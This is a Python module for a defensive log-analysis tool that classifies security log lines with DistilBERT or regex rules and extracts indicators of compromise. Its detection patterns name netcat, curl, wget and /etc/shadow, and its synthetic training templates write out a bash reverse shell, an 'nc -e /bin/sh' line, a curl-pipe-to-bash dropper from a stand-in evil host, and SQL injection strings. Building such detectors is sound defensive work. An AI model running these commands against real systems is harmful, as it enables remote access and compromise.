"""
NLP Log Analysis Module
=======================
Uses a fine-tuned DistilBERT transformer to classify security log lines
and extract threat indicators (IOCs).

Detected threat categories:
  • sql_injection          • command_injection
  • phishing_attempt       • credential_stuffing
  • malware_download       • data_exfiltration
  • privilege_escalation   • normal

Each log line produces:
  - risk_score      : float [0, 1]
  - threat_category : str
  - confidence      : float [0, 1]
  - indicators      : List[str]  (extracted IOC strings)
"""

import re
import logging
from dataclasses import dataclass, field
from typing import List, Optional, Dict, Tuple
from pathlib import Path

import numpy as np

logger = logging.getLogger(__name__)

# Lazy imports so the module is usable even without GPU/transformers installed
try:
    from transformers import (
        DistilBertTokenizerFast,
        DistilBertForSequenceClassification,
        pipeline,
        TrainingArguments,
        Trainer,
    )
    import torch
    from torch.utils.data import Dataset
    TRANSFORMERS_AVAILABLE = True
except ImportError:
    TRANSFORMERS_AVAILABLE = False
    logger.warning("HuggingFace Transformers not installed — using rule-based fallback.")


# ── Result dataclass ───────────────────────────────────────────────────────────
@dataclass
class LogAnalysisResult:
    risk_score:      float
    threat_category: str
    confidence:      float
    indicators:      List[str] = field(default_factory=list)
    raw_log:         str = ""
    model_type:      str = "bert"  # "bert" | "rule_based"


# ── Threat category definitions ────────────────────────────────────────────────
THREAT_CATEGORIES = [
    "normal",
    "sql_injection",
    "command_injection",
    "phishing_attempt",
    "credential_stuffing",
    "malware_download",
    "data_exfiltration",
    "privilege_escalation",
]

CATEGORY_RISK = {
    "normal": 0.05,
    "phishing_attempt": 0.60,
    "credential_stuffing": 0.70,
    "command_injection": 0.85,
    "sql_injection": 0.90,
    "malware_download": 0.88,
    "data_exfiltration": 0.92,
    "privilege_escalation": 0.87,
}

# ── IOC Extractor ──────────────────────────────────────────────────────────────
# Patterns to extract Indicators of Compromise from log text
IOC_PATTERNS: List[Tuple[str, re.Pattern]] = [
    ("ipv4",     re.compile(r"\b(?:\d{1,3}\.){3}\d{1,3}\b")),
    ("url",      re.compile(r"https?://[^\s'\"]+")),
    ("email",    re.compile(r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}")),
    ("hash_md5", re.compile(r"\b[a-fA-F0-9]{32}\b")),
    ("hash_sha", re.compile(r"\b[a-fA-F0-9]{40,64}\b")),
    ("base64",   re.compile(r"(?:[A-Za-z0-9+/]{30,}={0,2})")),
    ("cmd_exec", re.compile(
        r"\b(cmd\.exe|powershell|bash|sh|curl|wget|nc|netcat|python|perl|ruby)\b",
        re.IGNORECASE
    )),
    ("sql_kw",   re.compile(
        r"\b(UNION|SELECT|INSERT|DROP|DELETE|UPDATE|EXEC|xp_cmdshell|"
        r"OR\s+1=1|AND\s+1=1|--|#|;--)\b",
        re.IGNORECASE
    )),
    ("path_trav",re.compile(r"\.{2}[/\\]")),
    ("priv_esc", re.compile(r"\b(sudo|su\s|chmod\s777|/etc/sudoers|setuid)\b", re.IGNORECASE)),
]


def extract_iocs(log_line: str) -> List[str]:
    """Extract IOC strings found in a log line."""
    found = []
    for ioc_type, pattern in IOC_PATTERNS:
        matches = pattern.findall(log_line)
        for m in matches[:3]:   # cap per-type matches to avoid noise
            found.append(f"{ioc_type}:{m}")
    return found[:10]   # max 10 IOCs per line


# ── Rule-based fallback classifier ────────────────────────────────────────────
RULE_SIGNATURES: List[Tuple[str, re.Pattern, float]] = [
    # (category, pattern, confidence)
    ("sql_injection",       re.compile(r"union\s+select|drop\s+table|;--|' OR '1'='1", re.I), 0.93),
    ("sql_injection",       re.compile(r"xp_cmdshell|exec\(|waitfor delay", re.I),             0.90),
    ("command_injection",   re.compile(r";\s*(bash|sh|cmd|powershell)", re.I),                 0.88),
    ("command_injection",   re.compile(r"\|\s*(nc|netcat|wget|curl)\s", re.I),                 0.85),
    ("privilege_escalation",re.compile(r"sudo\s+su|chmod\s+777|/etc/shadow", re.I),            0.87),
    ("phishing_attempt",    re.compile(r"(login|account|verify|suspended).{0,40}(click|here|link)", re.I), 0.72),
    ("malware_download",    re.compile(r"(wget|curl).+\.(exe|bat|ps1|sh|elf)", re.I),           0.82),
    ("data_exfiltration",   re.compile(r"(exfil|dump|archive).+(curl|wget|ftp|scp)", re.I),    0.84),
    ("credential_stuffing", re.compile(r"login failed.{0,20}(attempt|retry) \d{2,}", re.I),    0.75),
    ("credential_stuffing", re.compile(r"(\d+) (failed|invalid) (login|auth|password)", re.I), 0.80),
]


def rule_based_classify(log_line: str) -> Tuple[str, float]:
    """Fast regex-based classification (fallback / pre-filter)."""
    best_cat, best_conf = "normal", 0.05
    for category, pattern, confidence in RULE_SIGNATURES:
        if pattern.search(log_line):
            if confidence > best_conf:
                best_cat, best_conf = category, confidence
    return best_cat, best_conf


# ── Fine-tune dataset ──────────────────────────────────────────────────────────
class LogDataset:
    """
    Minimal HuggingFace-compatible dataset wrapper.
    Feed labelled log lines for fine-tuning.
    """

    def __init__(self, texts: List[str], labels: List[int], tokenizer, max_length: int = 128):
        self.encodings = tokenizer(
            texts, truncation=True, padding=True, max_length=max_length
        )
        self.labels = labels

    def __getitem__(self, idx):
        import torch
        item = {k: torch.tensor(v[idx]) for k, v in self.encodings.items()}
        item["labels"] = torch.tensor(self.labels[idx])
        return item

    def __len__(self):
        return len(self.labels)


# ── NLP Analysis Engine ────────────────────────────────────────────────────────
class NLPLogAnalyzer:
    """
    Main log analysis engine.

    Two modes:
      1. BERT mode  — Uses DistilBERT fine-tuned on security logs (preferred)
      2. Rule mode  — Regex-based fallback when transformers unavailable
    """

    MODEL_ID   = "distilbert-base-uncased"
    MODEL_DIR  = Path("models/nlp_classifier")
    MAX_LENGTH = 256

    def __init__(self, use_gpu: bool = False):
        self.device     = "cuda" if (use_gpu and TRANSFORMERS_AVAILABLE
                                     and __import__("torch").cuda.is_available()) else "cpu"
        self.tokenizer  = None
        self.model      = None
        self._pipeline  = None
        self._bert_ready = False

        if TRANSFORMERS_AVAILABLE:
            self._try_load_bert()

    # ── Public API ─────────────────────────────────────────────────────────────

    def analyze(self, log_line: str) -> LogAnalysisResult:
        """Analyse a single log line and return a LogAnalysisResult."""
        iocs = extract_iocs(log_line)

        if self._bert_ready:
            return self._bert_analyze(log_line, iocs)
        return self._rule_analyze(log_line, iocs)

    def analyze_batch(self, log_lines: List[str]) -> List[LogAnalysisResult]:
        """Efficient batched analysis."""
        if self._bert_ready:
            return self._bert_batch(log_lines)
        return [self.analyze(line) for line in log_lines]

    # ── BERT inference ─────────────────────────────────────────────────────────

    def _bert_analyze(self, log_line: str, iocs: List[str]) -> LogAnalysisResult:
        results = self._pipeline(log_line[:512])
        top     = results[0]
        cat     = top["label"]
        conf    = top["score"]
        risk    = CATEGORY_RISK.get(cat, 0.5) * conf

        return LogAnalysisResult(
            risk_score=round(risk, 4),
            threat_category=cat,
            confidence=round(conf, 4),
            indicators=iocs,
            raw_log=log_line,
            model_type="bert",
        )

    def _bert_batch(self, lines: List[str]) -> List[LogAnalysisResult]:
        results = []
        for line in lines:
            iocs = extract_iocs(line)
            results.append(self._bert_analyze(line, iocs))
        return results

    # ── Rule-based inference ───────────────────────────────────────────────────

    def _rule_analyze(self, log_line: str, iocs: List[str]) -> LogAnalysisResult:
        cat, conf = rule_based_classify(log_line)

        # Boost confidence if multiple IOC types were found
        ioc_boost = min(len(iocs) * 0.03, 0.15)
        conf      = min(conf + ioc_boost, 0.99)
        risk      = CATEGORY_RISK.get(cat, 0.05) * conf

        return LogAnalysisResult(
            risk_score=round(risk, 4),
            threat_category=cat,
            confidence=round(conf, 4),
            indicators=iocs,
            raw_log=log_line,
            model_type="rule_based",
        )

    # ── Model loading / fine-tuning ────────────────────────────────────────────

    def _try_load_bert(self):
        """Attempt to load fine-tuned BERT from MODEL_DIR, or base model."""
        if not TRANSFORMERS_AVAILABLE:
            return
        try:
            model_path = str(self.MODEL_DIR) if self.MODEL_DIR.exists() else self.MODEL_ID
            logger.info("Loading NLP model from %s …", model_path)
            self.tokenizer = DistilBertTokenizerFast.from_pretrained(model_path)
            self.model     = DistilBertForSequenceClassification.from_pretrained(
                model_path,
                num_labels=len(THREAT_CATEGORIES),
                ignore_mismatched_sizes=True,
            )
            self._pipeline = pipeline(
                "text-classification",
                model=self.model,
                tokenizer=self.tokenizer,
                device=-1,  # CPU
                return_all_scores=False,
            )
            self._bert_ready = True
            logger.info("DistilBERT NLP analyzer ready (%s mode)", model_path)
        except Exception as exc:
            logger.warning("Failed to load BERT model: %s — using rule-based fallback", exc)
            self._bert_ready = False

    def fine_tune(
        self,
        train_texts:  List[str],
        train_labels: List[int],
        epochs:       int = 3,
        batch_size:   int = 16,
    ):
        """
        Fine-tune DistilBERT on labelled security log data.

        train_texts  : list of log line strings
        train_labels : list of int indices into THREAT_CATEGORIES
        """
        if not TRANSFORMERS_AVAILABLE:
            raise RuntimeError("Transformers library not installed")

        if self.tokenizer is None:
            self.tokenizer = DistilBertTokenizerFast.from_pretrained(self.MODEL_ID)

        dataset = LogDataset(train_texts, train_labels, self.tokenizer, self.MAX_LENGTH)

        if self.model is None:
            self.model = DistilBertForSequenceClassification.from_pretrained(
                self.MODEL_ID, num_labels=len(THREAT_CATEGORIES)
            )

        args = TrainingArguments(
            output_dir=str(self.MODEL_DIR),
            num_train_epochs=epochs,
            per_device_train_batch_size=batch_size,
            save_strategy="epoch",
            logging_steps=50,
            load_best_model_at_end=True,
            metric_for_best_model="eval_loss",
            warmup_steps=100,
            weight_decay=0.01,
        )

        trainer = Trainer(
            model=self.model,
            args=args,
            train_dataset=dataset,
        )
        trainer.train()
        trainer.save_model(str(self.MODEL_DIR))
        self.tokenizer.save_pretrained(str(self.MODEL_DIR))
        logger.info("Fine-tuned model saved to %s", self.MODEL_DIR)
        self._try_load_bert()   # reload pipeline with new weights


# ── Synthetic training data generator (for demo / CI) ─────────────────────────
def generate_synthetic_logs(n_per_class: int = 200) -> Tuple[List[str], List[int]]:
    """
    Generate simple synthetic log lines for each threat category.
    Useful for smoke-testing the fine-tuning pipeline.
    """
    import random

    templates: Dict[str, List[str]] = {
        "normal": [
            "GET /index.html HTTP/1.1 200 OK src={ip}",
            "User {user} authenticated successfully from {ip}",
            "SSH session opened for user {user} from {ip}",
            "Backup job completed successfully at 03:00 UTC",
        ],
        "sql_injection": [
            "GET /search?q=' OR '1'='1 HTTP/1.1 400 src={ip}",
            "POST /login username=admin'; DROP TABLE users; -- src={ip}",
            "SQL error: UNION SELECT * FROM credentials -- at {ip}",
        ],
        "command_injection": [
            "POST /api/ping?host={ip}; bash -i >& /dev/tcp/{ip}/4444 0>&1",
            "Web form input: | nc {ip} 4444 -e /bin/sh",
            "CMD exec detected: python3 -c 'import socket;s=socket...'",
        ],
        "credential_stuffing": [
            "47 failed login attempts for user admin from {ip} in 60s",
            "Rate limit hit: 200 invalid password retries from {ip}",
            "Credential check: invalid password for {user} attempt 89",
        ],
        "privilege_escalation": [
            "sudo su - root executed by {user} from {ip}",
            "chmod 777 /etc/shadow attempted by {user}",
            "Suspicious: /etc/sudoers modified by non-root process",
        ],
        "malware_download": [
            "wget http://malicious.xyz/payload.exe from {ip}",
            "curl -s https://evil.ru/dropper.sh | bash executed",
            "Download attempt: {ip} requested /tmp/rev_shell.elf",
        ],
        "data_exfiltration": [
            "Large outbound transfer: 2.4GB to {ip} via FTP at 02:17",
            "Unusual data dump: 50,000 rows exported and scp'd to {ip}",
            "S3 bucket policy changed; 8GB exfiltrated to {ip}",
        ],
        "phishing_attempt": [
            "Email from spoofed-{user}@legit.com: 'Account suspended, click here'",
            "Phishing URL clicked: http://verify-account.evil.com/login?user={user}",
            "Email body contains: 'Verify your account or it will be deleted'",
        ],
    }

    ips   = [f"192.168.{i}.{j}" for i in range(1, 5) for j in range(1, 50)]
    users = ["alice", "bob", "admin", "svc_account", "jenkins", "root"]

    texts, labels = [], []
    for label_idx, category in enumerate(THREAT_CATEGORIES):
        tmpl_list = templates.get(category, templates["normal"])
        for _ in range(n_per_class):
            tmpl = random.choice(tmpl_list)
            line = tmpl.format(
                ip=random.choice(ips),
                user=random.choice(users),
            )
            texts.append(line)
            labels.append(label_idx)

    # Shuffle together
    combined = list(zip(texts, labels))
    random.shuffle(combined)
    return [t for t, _ in combined], [l for _, l in combined]


# ── CLI smoke test ─────────────────────────────────────────────────────────────
if __name__ == "__main__":
    analyzer = NLPLogAnalyzer()

    test_logs = [
        "GET /index.html HTTP/1.1 200 OK",
        "POST /login username=admin'; DROP TABLE users; -- from 203.0.113.5",
        "47 failed login attempts for user root from 198.51.100.9 in 60 seconds",
        "wget http://evil.xyz/rev_shell.elf executed by process 1337",
        "sudo su - root executed by svc_account from 10.0.0.201",
        "Large outbound transfer: 3.1GB to 203.0.113.1 via SCP at 03:12 UTC",
    ]

    print("=== NLP Log Analyzer ===\n")
    for log in test_logs:
        r = analyzer.analyze(log)
        print(f"LOG:  {log[:70]}…" if len(log) > 70 else f"LOG:  {log}")
        print(f"  → [{r.threat_category}] risk={r.risk_score:.3f} "
              f"conf={r.confidence:.3f} model={r.model_type}")
        if r.indicators:
            print(f"  → IOCs: {r.indicators[:4]}")
        print()
